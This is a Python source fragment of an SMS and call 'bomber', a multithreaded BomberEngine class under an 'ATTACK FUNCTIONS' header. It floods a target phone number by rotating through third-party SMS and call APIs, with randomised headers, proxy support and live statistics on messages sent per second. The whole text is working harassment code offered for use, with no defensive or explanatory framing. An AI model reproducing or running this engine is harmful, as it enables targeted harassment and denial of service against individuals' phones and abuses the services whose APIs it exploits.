# ============== ATTACK FUNCTIONS ==============

class BomberEngine:
    """Core bombing engine with threading, retries, and statistics"""

    def __init__(self, phone, threads=20, delay=0.5, message_pool=None,
                 mode="sms", proxies=None, use_rotation=True, max_duration=300):
        self.phone = phone
        self.threads = min(threads, 50)
        self.delay = delay
        self.message_pool = message_pool or DEFAULT_MESSAGES
        self.mode = mode.lower()
        self.proxies = proxies
        self.use_rotation = use_rotation
        self.max_duration = max_duration

        self.sent_count = 0
        self.fail_count = 0
        self.running = False
        self.start_time = None
        self.api_errors = {}
        self.lock = threading.Lock()

        # Select API list based on mode
        if self.mode == "call":
            self.api_list = CALL_API_LIST
        else:
            self.api_list = SMS_API_LIST

        # Build weighted selection pool
        self.api_pool = []
        for i, api in enumerate(self.api_list):
            weight = api.get("weight", 3)
            self.api_pool.extend([i] * weight)

        random.shuffle(self.api_pool)
        self.api_index = 0

        # Session with connection pooling
        self.session = requests.Session()

    def get_next_api(self):
        """Get next API configuration using rotation"""
        if not self.use_rotation:
            return random.choice(self.api_list)

        idx = self.api_pool[self.api_index % len(self.api_pool)]
        self.api_index += 1
        return self.api_list[idx]

    def send_sms(self, api_config):
        """Send a single SMS via the given API configuration"""
        try:
            # Prepare the request
            url = api_config["url"]
            method = api_config.get("method", "POST")
            headers = {**random_headers(), **api_config.get("headers", {})}
            auth = api_config.get("auth", None)

            # Format message
            msg = random.choice(self.message_pool)

            # Prepare parameters
            if "data" in api_config:
                data = {}
                for key, val in api_config["data"].items():
                    if isinstance(val, str):
                        data[key] = val.format(phone=self.phone, message=msg)
                    elif isinstance(val, list):
                        data[key] = [v.format(phone=self.phone, message=msg) if isinstance(v, str) else v for v in val]
                    else:
                        data[key] = val
            else:
                data = {}

            if "params" in api_config:
                params = {k: v.format(phone=self.phone, message=msg) for k, v in api_config["params"].items()}
            else:
                params = {}

            # Apply random delay before request
            jitter = random.uniform(0, self.delay)
            time.sleep(jitter)

            # Make the request
            if method.upper() == "GET":
                resp = self.session.get(url, params=params, headers=headers,
                                        auth=auth, proxies=self.proxies, timeout=15)
            else:
                resp = self.session.post(url, data=data, params=params,
                                         headers=headers, auth=auth,
                                         proxies=self.proxies, timeout=15)

            # Check success
            success = api_config.get("success_check", lambda r: r.status_code < 400)(resp)

            with self.lock:
                if success:
                    self.sent_count += 1
                else:
                    self.fail_count += 1
                    api_name = url.split('/')[2] if '//' in url else url[:40]
                    self.api_errors[api_name] = self.api_errors.get(api_name, 0) + 1

            return success

        except requests.exceptions.Timeout:
            with self.lock:
                self.fail_count += 1
            return False
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.fail_count += 1
            return False
        except Exception as e:
            with self.lock:
                self.fail_count += 1
            return False

    def send(self):
        """Send a single SMS/Call using a random API"""
        api = self.get_next_api()
        return self.send_sms(api)

    def worker(self, task_queue):
        """Worker thread that processes attack tasks"""
        while self.running:
            try:
                _ = task_queue.get(timeout=1)
            except Exception:
                continue

            if not self.running:
                break

            self.send()

            # Check duration limit
            if self.start_time and (datetime.now() - self.start_time).seconds >= self.max_duration:
                self.running = False
                break

    def stats(self):
        """Get current statistics"""
        elapsed = (datetime.now() - self.start_time).seconds if self.start_time else 0
        rate = self.sent_count / elapsed if elapsed > 0 else 0
        return {
            "sent": self.sent_count,
            "failed": self.fail_count,
            "total": self.sent_count + self.fail_count,
            "elapsed": elapsed,
            "rate": rate,
        }

    def print_stats(self):
        """Print live statistics"""
        stats = self.stats()
        print(f"\r{Fore.CYAN}[*] Sent: {Fore.GREEN}{stats['sent']}{Fore.CYAN} | "
              f"Failed: {Fore.RED}{stats['failed']}{Fore.CYAN} | "
              f"Rate: {Fore.YELLOW}{stats['rate']:.1f}/s{Fore.CYAN} | "
              f"Elapsed: {Fore.MAGENTA}{stats['elapsed']}s{Style.RESET_ALL}", end="")

    def start(self):
        """Start the bombing engine"""
        self.running = True
        self.start_time = datetime.now()

        task_queue = Queue()
        # Fill the queue with infinite tasks (we'll stop based on time)
        for _ in range(10000):
            task_queue.put(None)

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, args=(task_queue,), daemon=True)
            t.start()
            threads.append(t)

        # Stats display thread
        try:
            while self.running:
                if (datetime.now() - self.start_time).seconds >= self.max_duration:
                    self.running = False
                    break

                self.print_stats()
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")

        # Wait for threads
        for t in threads:
            t.join(timeout=2)

        print(f"\n")

    def final_stats(self):
        """Print final statistics"""
        stats = self.stats()
        print(f"\n{Fore.CYAN}╔══ Final Results ══╗{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  ✓ Total Sent:     {stats['sent']}{Style.RESET_ALL}")
        print(f"{Fore.RED}  ✗ Total Failed:   {stats['failed']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  ➤ Total Attempts: {stats['total']}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}  ⏱ Duration:       {stats['elapsed']}s{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  📈 Avg Rate:       {stats['rate']:.2f} msgs/s{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════╝{Style.RESET_ALL}")

        if self.api_errors:
            print(f"\n{Fore.YELLOW}  API Error Breakdown:{Style.RESET_ALL}")
            for api, count in sorted(self.api_errors.items(), key=lambda x: -x[1])[:5]:
                print(f"    {Fore.RED}{api}: {count} errors{Style.RESET_ALL}")


